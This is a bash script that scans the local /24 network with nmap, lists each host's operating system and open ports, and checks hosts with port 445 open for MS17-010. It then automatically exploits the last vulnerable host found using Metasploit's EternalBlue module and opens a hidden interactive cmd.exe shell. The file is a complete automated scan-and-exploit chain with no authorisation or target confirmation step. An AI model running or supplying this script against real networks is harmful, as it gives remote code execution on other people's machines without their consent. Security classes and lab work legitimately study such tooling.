#!/bin/bash

#1. Get IP of current device
myip=`hostname -I | awk '{print $1;}'`


# 2. Select the first 3 numbers of IP
base=`echo $myip | cut -d "." -f 1-3`


# 3. Build the /24 network
network="$base.0/24"

echo "Scanning Devices Connected to: $network"
echo


# 4. Find Live Hosts
hosts=`sudo nmap -sn "$network" 2>/dev/null | grep "Nmap scan report" | awk '{print $5}'`

if [ "$hosts" = "" ]; then # If Empty
  echo "No Hosts Found."
fi

# Create an Empty variable to store the host that has a vulnerability later:
first_vuln=""


# 5. For each host, run an OS & Port scan then Print it in a table

printf "\n%-15s | %-25s | %s\n" "Device" "Operating System" "Open Ports"
printf "%s\n" "-------------------------------------------------------------"

for h in $hosts; do
  echo
  scan=`sudo nmap -Pn --top-ports 100 -sV -O -T4 "$h" 2>/dev/null`

  # Finding Operating System
  os=`echo "$scan" | grep -E 'OS details:|Aggressive OS guesses:' | head -n1 | cut -d':' -f2- | cut -d',' -f1 | sed 's/^ //'`

  if [ "$os" = "" ]; then # If Empty
    os="unknown"
  fi
  
  
  # Finding open TCP ports
  ports=`echo "$scan" | grep "open" | grep "tcp" | cut -d "/" -f1 | xargs`

  if [ "$ports" = "" ]; then # If Empty
    ports="none-shown"
  fi


  # print summary
  printf "%-15s | %-25s | ports: %s\n" "$h" "$os" "$ports"
  
  
  # Checking for EternalBlue (only if port 445 is open)
  echo
  if echo " $ports " | grep -qw "445"; then
    vulnr=$(sudo nmap -Pn -p445 --script smb-vuln-ms17-010 "$h" 2>/dev/null)
    if echo "$vulnr" | grep -qi -E "VULNERABLE|MS17-010"; then
      echo "[!] $h: MS17-010 / EternalBlue detected"
      first_vuln="$h"
      #break
    else
      echo "[ ] $h: MS17-010 not detected"
    fi
  fi
  
done

# 6. Exploit EternalBlue (if it exists) Using Metasplot


if [ "$first_vuln" != "" ]; then
  echo
  echo "Exploiting $first_vuln ..."
  echo
# Check if database is already running, if not start it:
  if ! msfdb status 2>/dev/null | grep -q "running"; then
    sudo msfdb init >/dev/null 2>&1
  fi
  
  cat > eb.rc << END
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOST $first_vuln
  run
  execute -f cmd.exe -H -c -i
END
  
  msfconsole -r eb.rc
  rm -f eb.rc

fi
